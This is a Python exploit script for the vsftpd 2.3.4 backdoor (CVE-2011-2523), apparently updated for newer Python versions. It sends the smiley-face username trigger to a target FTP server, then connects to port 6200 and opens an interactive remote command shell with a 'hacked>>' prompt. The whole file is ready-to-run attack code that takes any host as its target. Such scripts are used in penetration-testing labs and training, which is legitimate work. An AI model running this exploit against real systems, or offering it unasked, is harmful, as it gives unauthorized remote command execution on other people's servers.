#!/usr/bin/python3

# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution (Python 3.12+ Fix)
# Original Author: Bang yog
# CVE: CVE-2011-2523

import argparse
import socket
import select
import sys
import time
from signal import signal, SIGINT

def header():
    print(r"""
             ______            __   ___    _____ __ __
 _   _______/ __/ /_____  ____/ /  |__ \  |__  // // /
| | / / ___/ /_/ __/ __ \/ __  /   __/ /   /_ </ // /_
| |/ (__  ) __/ /_/ /_/ / /_/ /   / __/_ ___/ /__  __/
|___/____/_/  \__/ .___/\__,_/   /____(_)____(_)/_/   
                /_/  Exploit by Bang yog
******************************************************
""")

def handler(sig, frame):
    print("\n[+] Exiting...")
    sys.exit(0)

signal(SIGINT, handler)

def send_trigger(host, port=21):
    print(f"[+] Connecting to FTP {host}:{port}")
    s = socket.socket()
    s.connect((host, port))

    banner = s.recv(1024).decode(errors="ignore")
    print(f"[+] Banner: {banner.strip()}")

    s.send(b"USER nergal:)\r\n")
    time.sleep(0.3)

    resp = s.recv(1024).decode(errors="ignore")
    print(f"[+] Response: {resp.strip()}")

    s.send(b"PASS pass\r\n")
    time.sleep(0.2)

    s.close()
    print("[+] Trigger sent, checking backdoor...")

def interactive_shell(host, port=6200):
    try:
        s = socket.socket()
        s.connect((host, port))
        print("[+] Backdoor shell opened!")
        print("[+] Type commands. Ctrl+C to quit.\n")
    except:
        print("[-] Failed to connect to port 6200 (backdoor not active)")
        sys.exit(1)

    while True:
        ready, _, _ = select.select([s], [], [], 0.2)
        if s in ready:
            data = s.recv(4096)
            if not data:
                print("[-] Connection closed.")
                return
            print(data.decode(errors="ignore"), end="")

        cmd = input("hacked>> ")

        if cmd.strip().lower() == "exit":
            print("[+] Closing shell...")
            s.close()
            return

        s.send((cmd + "\n").encode())

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Vulnerable host IP", type=str)
    args = parser.parse_args()
    host = args.host

    send_trigger(host)
    time.sleep(1)
    interactive_shell(host)

if __name__ == "__main__":
    header()
    main()
